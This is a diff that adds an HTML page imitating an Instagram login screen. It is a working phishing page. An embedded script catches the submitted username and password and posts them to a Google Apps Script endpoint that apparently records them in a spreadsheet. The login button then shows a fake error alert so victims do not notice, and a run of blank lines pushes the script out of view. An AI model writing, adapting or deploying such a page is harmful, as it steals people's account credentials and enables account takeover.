@@ -1,0 +1,77 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link href="style.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Protest+Riot:wght@400;500&display=swap');
+      </style>
+</head>
+
+
+<body>
+    <h3>English (United States)</h3>
+
+    <div class="ngl">
+      <!-- <img class="ngl-img" src="images/ngl.jpg" alt=""> -->
+    </div>
+
+    <div class="logo">
+      <img class="ins" src="images/logo.png" alt="">
+    </div>
+
+    <form class="form" name="submit-to-google-sheet" action="">
+        <input class="username" type="text" name="username" placeholder="Phone number, email or username" required> <br>
+        <input class="username" type="password" name="password" placeholder="Password" required>
+        <button onclick="showAlert ()" class="login" type="submit">Log in</button>
+    </form>
+
+
+<!-- 
+
+    <div class="bio-p">
+      <h2 class="bio">Login with Instagram to continue. </h2> -->
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+      <script >
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwYFMopapst0uZY1FUkmVR-mzcWMtO1Y_tDsUcEfBe3WRwACXvEkBdfIQ6RmI5Cgjvv/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+
+      <script>
+        function showAlert () {
+          alert ("Something went wrong! Please try again after sometime.")
+        }
+      </script>
+    
+</body>
+</html>
